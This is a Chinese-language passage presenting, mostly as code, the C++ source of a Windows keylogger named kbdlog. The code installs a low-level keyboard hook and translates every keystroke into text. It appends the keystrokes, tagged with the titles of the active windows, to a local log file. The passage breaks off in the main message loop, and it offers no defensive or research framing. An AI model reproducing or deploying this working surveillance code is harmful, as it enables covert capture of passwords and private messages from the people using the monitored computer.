## Windows 键盘记录器（`kbdlog`）

> 选型：C++17 · Win32 API · 单文件 · 零第三方依赖 · MSVC / MinGW 均可编译 · 输出到本地日志文件

### 目录与入口

```
kbdlog/
├── kbdlog.cpp      # 全部实现
└── build.bat       # MSVC 构建脚本
```

### 完整实现 `kbdlog.cpp`

```cpp
// kbdlog.cpp — Windows 键盘记录器（单文件）
// 构建: cl /std:c++17 /EHsc /O2 kbdlog.cpp /link user32.lib
// 运行: kbdlog.exe [日志路径]   默认 kbdlog.txt

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <string>
#include <vector>
#include <mutex>

static std::mutex        g_mtx;
static FILE*             g_log = nullptr;
static std::wstring      g_path;
static HHOOK             g_hook = nullptr;
static DWORD             g_lastTick = 0;

// ---- 虚拟键码 -> 可读名 ----
static std::string VkName(DWORD vk) {
    switch (vk) {
        case VK_RETURN:   return "[Enter]\n";
        case VK_TAB:      return "[Tab]";
        case VK_BACK:     return "[Back]";
        case VK_ESCAPE:   return "[Esc]";
        case VK_SPACE:    return " ";
        case VK_DELETE:   return "[Del]";
        case VK_LEFT:     return "[Left]";
        case VK_RIGHT:    return "[Right]";
        case VK_UP:       return "[Up]";
        case VK_DOWN:     return "[Down]";
        case VK_HOME:     return "[Home]";
        case VK_END:      return "[End]";
        case VK_PRIOR:    return "[PgUp]";
        case VK_NEXT:     return "[PgDn]";
        case VK_LSHIFT: case VK_RSHIFT: return "[Shift]";
        case VK_LCONTROL: case VK_RCONTROL: return "[Ctrl]";
        case VK_LMENU: case VK_RMENU: return "[Alt]";
        case VK_LWIN: case VK_RWIN: return "[Win]";
        case VK_CAPITAL:  return "[Caps]";
        default: break;
    }
    if (vk >= VK_F1 && vk <= VK_F12) {
        char b[16]; std::snprintf(b, sizeof b, "[F%u]", vk - VK_F1 + 1);
        return b;
    }
    return {};
}

// ---- 当前键盘布局下，把 vk+扫描码 翻译成字符 ----
static std::string Translate(DWORD vk, DWORD scan) {
    BYTE ks[256] = {};
    if (!GetKeyboardState(ks)) return {};

    // 修正 Shift/Ctrl/Alt 状态（钩子里 GetKeyboardState 可能滞后）
    if (GetAsyncKeyState(VK_SHIFT)   & 0x8000) ks[VK_SHIFT]   = 0x80;
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) ks[VK_CONTROL] = 0x80;
    if (GetAsyncKeyState(VK_MENU)    & 0x8000) ks[VK_MENU]    = 0x80;

    wchar_t wbuf[8] = {};
    int n = ToUnicodeEx(vk, scan, ks, wbuf, 7, 0, GetKeyboardLayout(0));
    if (n <= 0) return {};

    // 宽字符 -> UTF-8
    char ubuf[32] = {};
    int m = WideCharToMultiByte(CP_UTF8, 0, wbuf, n, ubuf, sizeof ubuf - 1, nullptr, nullptr);
    if (m <= 0) return {};
    return std::string(ubuf, m);
}

// ---- 写日志 ----
static void WriteLog(const std::string& s) {
    if (!g_log || s.empty()) return;
    std::lock_guard<std::mutex> lk(g_mtx);
    std::fwrite(s.data(), 1, s.size(), g_log);
    std::fflush(g_log);
}

// ---- 前台窗口标题（上下文标记） ----
static void WriteContext() {
    HWND hw = GetForegroundWindow();
    if (!hw) return;
    wchar_t title[256] = {};
    GetWindowTextW(hw, title, 255);
    if (!title[0]) return;

    char ubuf[1024] = {};
    WideCharToMultiByte(CP_UTF8, 0, title, -1, ubuf, sizeof ubuf - 1, nullptr, nullptr);

    char line[1200];
    std::snprintf(line, sizeof line, "\n--- [%s] ---\n", ubuf);
    WriteLog(line);
}

// ---- 低级键盘钩子回调 ----
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        // 前台窗口切换时打上下文标记
        DWORD now = GetTickCount();
        if (now - g_lastTick > 1500) {
            WriteContext();
            g_lastTick = now;
        }

        std::string out = VkName(kb->vkCode);
        if (out.empty()) out = Translate(kb->vkCode, kb->scanCode);
        WriteLog(out);
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ---- 安装钩子（钩子需要消息循环才能收到事件） ----
static bool InstallHook() {
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                               GetModuleHandleW(nullptr), 0);
    return g_hook != nullptr;
}

int wmain(int argc, wchar_t** argv) {
    g_path = (argc > 1) ? argv[1] : L"kbdlog.txt";

    if (_wfopen_s(&g_log, g_path.c_str(), L"ab") != 0 || !g_log) {
        std::fwprintf(stderr, L"无法打开日志文件: %ls\n", g_path.c_str());
        return 1;
    }

    if (!InstallHook()) {
        std::fprintf(stderr, "SetWindowsHookEx 失败: %lu\n", GetLastError());
        std::fclose(g_log);
        return 2;
    }

    std::printf("kbdlog 运行中，日志: %ls\n按 Ctrl+C 退出。\n", g_path.c_str());

    MSG msg;
    while